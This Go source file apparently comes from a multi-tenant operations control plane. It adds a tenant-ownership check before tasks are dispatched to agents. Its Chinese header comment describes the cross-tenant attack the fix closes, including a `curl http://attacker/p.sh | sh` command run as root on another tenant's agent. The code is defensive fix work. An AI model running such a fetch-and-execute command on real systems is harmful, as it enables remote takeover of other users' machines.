package controlplane

// tenant_guard.go 多租户隔离的统一防线（P0-6）。
//
// 背景（商用就绪评审 P0-6 问题 B —— 跨租户远程命令执行）：
// 任务队列按 agent_id 单独寻址（store.ClaimTask 的 WHERE agent_id=? 无租户维度），
// 而多条「下发任务」的 HTTP 路径直接取请求体里的 deviceID/agentID 建任务、未校验
// 目标 agent 归属。完整攻击链：
//  1. 租户 A 中具备 script:write / cmdb:write 的主体（cmdb 属 operatorGroups，
//     故默认 operator 角色即可）创建内容为 `curl http://attacker/p.sh | sh` 的脚本；
//  2. POST /api/v1/scripts/{id}/execute {"deviceID":"<租户 B 的 agentID>"}
//     → 无租户校验，任务创建成功；
//  3. 租户 B 的 agent 按 agent_id 领取该任务并以 root 执行。
//
// 本文件提供统一校验入口，取代「各 handler 各写一份」的做法：
//   - requireTenantAgent：HTTP 路径用（校验失败写 403 并返回 false）；
//   - tenantAgent：非 HTTP 路径/执行器用（background 循环、automation 执行器）。
//
// 判定语义与既有正确实现（server_tasks.go handleCreateTask、
// middleware_deploy_handler.go、os_template_handlers.go、server_network.go）保持一致：
// agent 不存在，或其 TenantID 与调用方租户不一致 → 拒绝。
// 调用方租户为空（--require-auth=false 的无租户开放模式）时跳过归属校验，
// 保持内网/开发部署的既有行为不变。

import (
	"net/http"

	"github.com/Levango7/OpsMesh/internal/controlplane/paginate"
	"github.com/Levango7/OpsMesh/internal/controlplane/tenantguard"
	"github.com/Levango7/OpsMesh/internal/proto"
	"github.com/Levango7/OpsMesh/internal/store"
)

// ----- TD-87 批 2 第二批：纯校验逻辑已迁 internal/controlplane/tenantguard，以下为薄包装 -----
//
// 保留同名包装的理由：tenantOrDefault 等有 30 处调用点（auth_users/auth_login/auth_tokens/
// automation/pipeline/script/测试），包装让它们零改动；规则本体在 tenantguard 包，测试可直接打。

// tenantOrDefault 将空租户归一为平台默认租户 "default"（tenantguard.TenantOrDefault 包装）。
func tenantOrDefault(tenantID string) string { return tenantguard.TenantOrDefault(tenantID) }

// validateTenantID 校验租户 ID 字面量是否合法（tenantguard.ValidateTenantID 包装）。
func validateTenantID(tenantID string) error { return tenantguard.ValidateTenantID(tenantID) }

// tenantAgentIn 解析目标 agent 并校验其归属租户（tenantguard.TenantAgentIn 包装）。
func tenantAgentIn(st store.Store, agentID, tenantID string) (*proto.AgentInfo, error) {
	return tenantguard.TenantAgentIn(st, agentID, tenantID)
}

// tenantAgent 解析目标 agent 并校验其归属租户（非 HTTP 路径）。
func (s *Server) tenantAgent(agentID, tenantID string) (*proto.AgentInfo, error) {
	return tenantAgentIn(s.store, agentID, tenantID)
}

// requireTenantAgent 校验目标 agent 存在且属于调用方租户；失败时已写响应，返回 false。
// 所有「用户可指定 agentID 下发任务」的 HTTP handler 必须先调用本函数再建任务。
func (s *Server) requireTenantAgent(w http.ResponseWriter, agentID, tenantID string) (*proto.AgentInfo, bool) {
	agent, err := s.tenantAgent(agentID, tenantID)
	if err != nil {
		paginate.WriteJSON(w, http.StatusForbidden, map[string]string{"error": err.Error()})
		return nil, false
	}
	return agent, true
}
